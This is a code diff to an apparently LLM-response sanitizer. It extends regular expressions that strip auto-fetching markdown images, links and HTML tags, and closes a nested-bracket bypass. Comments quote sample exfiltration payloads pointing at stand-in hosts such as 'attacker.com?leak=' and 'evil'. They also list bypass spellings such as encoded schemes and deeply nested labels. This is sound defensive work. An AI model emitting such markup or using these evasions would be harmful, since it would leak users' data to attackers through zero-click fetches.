@@ -152,6 +152,32 @@ class PromptBundle:
     nonce: str
 
 
+# CommonMark link TEXT may contain BALANCED brackets, and markdown-it
+# accepts them at UNBOUNDED nesting depth (renderer-adjudicated:
+# `![a[b[c[d[e[f[g]]]]]]](url)` still renders an auto-fetching
+# image), while the family's `[^\]]{0,8192}` label grammar stops at
+# the first `]` — `![a[b]](https://evil/x.png)` was a zero-click
+# fetch through every arm. Two layers close the class:
+#
+# * `_NESTED_LABEL` widens the label grammar to TWO nesting levels
+#   (whole-construct removal for every realistic label; the
+#   alternation branches are first-char disjoint so matching stays
+#   linear). Reference-definition/usage LABELS keep the flat grammar
+#   deliberately — CommonMark reference labels may not contain
+#   unescaped brackets.
+# * Because no finite regex depth can match the renderer's unbounded
+#   acceptance, closer-anchored belt arms (`](scheme:…)` /
+#   `](//…)`, plus the decode-then-match chokepoint below, which is
+#   also closer-anchored) strip the DESTINATION tail at ANY depth —
+#   destroying the construct even when the label out-nests the
+#   grammar. Residual, named: nested-label images with RELATIVE
+#   destinations beyond depth 2 are not stripped — a relative
+#   destination fetches from the rendering origin and carries no
+#   attacker exfil target.
+_NESTED_LABEL = (
+    r'(?:[^\][]|\[(?:[^\][]|\[[^\][]{0,4096}\]){0,4096}\]){0,8192}'
+)
+
 # Markup that auto-fetches external resources from inside an LLM response —
 # defended against because an attacker can use it for exfiltration:
 # `![](attacker.com?leak=...)` doesn't need to hijack output, just slip into
@@ -165,12 +191,12 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # HTML tags fit well under 1 KB; 8 KB leaves headroom for a
     # legitimately long URL plus attribute clutter while bounding
     # adversarial input. Each arm gets its own `{0,8192}` cap.
-    r'!\[[^\]]{0,8192}\]\([^)]{1,8192}\)'
+    r'!\[' + _NESTED_LABEL + r'\]\([^)]{1,8192}\)'
     # Markdown link with auto-fetching scheme. `vbscript:` is the IE-era
     # equivalent of `javascript:` and still parses in some renderers.
     # `//host/path` (scheme-relative) inherits the page scheme — at-risk
     # in any context where the rendered output flows back to a browser.
-    r'|\[[^\]]{0,8192}\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:[^)]{1,8192}\)'
+    r'|\[' + _NESTED_LABEL + r'\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:[^)]{1,8192}\)'
     # Encoded-spelling scheme belt (kin of the ht%74ps arm above,
     # which is one spelling deep): any destination whose scheme-
     # position head carries a percent-escape or an HTML entity before
@@ -179,13 +205,22 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # dispatch. Plain relative paths (no colon) and ordinary URLs
     # (colon before any %/&) never match; the head is bounded so the
     # arm stays linear.
-    r'|\[[^\]]{0,8192}\]\([^):\s]{0,128}[%&][^):\s]{0,128}:[^)]{1,8192}\)'
-    r'|\[[^\]]{0,8192}\]\(//[^)]{1,8192}\)'
+    r'|\[' + _NESTED_LABEL + r'\]\([^):\s]{0,128}[%&][^):\s]{0,128}:[^)]{1,8192}\)'
+    r'|\[' + _NESTED_LABEL + r'\]\(//[^)]{1,8192}\)'
+    # Closer-anchored belts: strip the destination TAIL of any
+    # link/image whose label out-nests the grammar above — the
+    # rendered construct requires the literal `](dest)` closer, so
+    # destroying it kills the fetch at ANY nesting depth. Benign
+    # code shapes (`arr[i](x)`) carry no scheme and never match.
+    r'|\]\(\s{0,8}(?:https?|ht%74ps?|data|javascript|vbscript|file|ftp):[^)]{1,8192}\)'
+    r'|\]\(\s{0,8}//[^)]{1,8192}\)'
+    r'|\]\(\s{0,8}(?:https?|ht%74ps?|data|javascript|vbscript|file|ftp):(?=[^)]{8192})'
+    r'|\]\(\s{0,8}//(?=[^)]{8192})'
     # Inline link/image with an angle-bracket destination —
     # `[click](<javascript:...>)` / `![x](<//evil>)`. The `\(scheme:`
     # arms above never see the `<`, and angle destinations may contain
     # spaces, so strip the form regardless of the scheme spelling.
-    r'|!?\[[^\]]{0,8192}\]\(\s{0,8}<[^>\n]{0,8192}>'
+    r'|!?\[' + _NESTED_LABEL + r'\]\(\s{0,8}<[^>\n]{0,8192}>'
     # `<image>` is the HTML parser's alias for `<img>` (auto-fetches);
     # `<input type=image>` fetches its src; `<frame>`/`<track>` fetch;
     # `<bgsound>`/`<applet>`/`<portal>` are legacy/experimental
@@ -278,9 +313,9 @@ _AUTOFETCH_MARKUP_RE = re.compile(
     # lookaheads make these arms fire only when the bounded arms
     # cannot (≥8192 chars with no delimiter), and keep scanning
     # bounded.
-    r'|!\[[^\]]{0,8192}\]\((?=[^)]{8192})'
-    r'|\[[^\]]{0,8192}\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:(?=[^)]{8192})'
-    r'|\[[^\]]{0,8192}\]\(//(?=[^)]{8192})'
+    r'|!\[' + _NESTED_LABEL + r'\]\((?=[^)]{8192})'
+    r'|\[' + _NESTED_LABEL + r'\]\((?:https?|ht%74ps?|data|javascript|vbscript|file|ftp)?:(?=[^)]{8192})'
+    r'|\[' + _NESTED_LABEL + r'\]\(//(?=[^)]{8192})'
     r'|<(?:img|image|iframe|object|embed|video|audio|source|track'
     r'|input|frame|link|script|base|form|use|bgsound|applet|portal'
     r'|svg|meta|style)\b(?=[^>]{8192})'
@@ -526,7 +561,11 @@ _BYPASS_CHAR_RE = re.compile(
 # are judged (raw spellings stay owned by the raw arms), so benign
 # entities in prose and undecoded destinations render exactly as
 # before.
-_MD_LINK_DEST_RE = re.compile(r'!?\[[^\]]{0,8192}\]\(\s{0,8}([^)]{1,8192})\)')
+# Closer-anchored (`](dest)`) rather than label-anchored: CommonMark
+# labels nest to unbounded depth, so anchoring on the label would
+# reopen the class the belts above close; the decode decision only
+# needs the destination.
+_MD_LINK_DEST_RE = re.compile(r'\]\(\s{0,8}([^)]{1,8192})\)')
 # CommonMark: a backslash before ASCII punctuation escapes it (the
 # backslash is dropped); before anything else it stays literal.
 _BACKSLASH_ESCAPE_RE = re.compile(r'\\([!-/:-@\[-`{-~])')
